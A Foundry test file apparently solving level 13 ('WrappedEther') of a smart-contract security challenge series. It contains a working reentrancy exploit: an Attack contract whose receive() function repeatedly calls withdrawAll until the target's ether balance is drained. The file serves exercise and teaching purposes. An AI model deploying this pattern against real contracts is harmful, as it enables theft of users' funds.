// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "../src/13_WrappedEther/WrappedEther.sol";

// forge test --match-contract WrappedEtherTest
contract WrappedEtherTest is BaseTest {
    WrappedEther instance;
    Attack attack;

    function setUp() public override {
        super.setUp();

        instance = new WrappedEther();

        // Deploy the attack contract with 0.09 ether to use for the exploit
        attack = new Attack{value: 0.09 ether}(instance);
        instance.deposit{value: 0.09 ether}(address(this));
    }

    function testExploitLevel() public {
        /* YOUR EXPLOIT GOES HERE */
        attack.startAttack{value: 0.09 ether}();

        checkSuccess();
    }

    function checkSuccess() internal view override {
        assertTrue(address(instance).balance == 0, "Solution is not solving the level");
    }
}
contract Attack {
    WrappedEther target;
    uint256 value;

    constructor(WrappedEther _target) payable {
        // Initialize the target contract and store the value used for the deposit
        target = _target;
        // Set value to the ether amount passed on deployment (0.09 ether in this case)
        value = msg.value;
    }

    function startAttack() external payable {
        target.deposit{value: value}(address(this));
        target.withdrawAll();
    }

    // The receive function is triggered when ether is sent to this contract
    // It allows for reentrancy by recursively calling withdrawAll
    receive() external payable {
        if(address(target).balance >= value) {
            target.withdrawAll();
        }
    }
}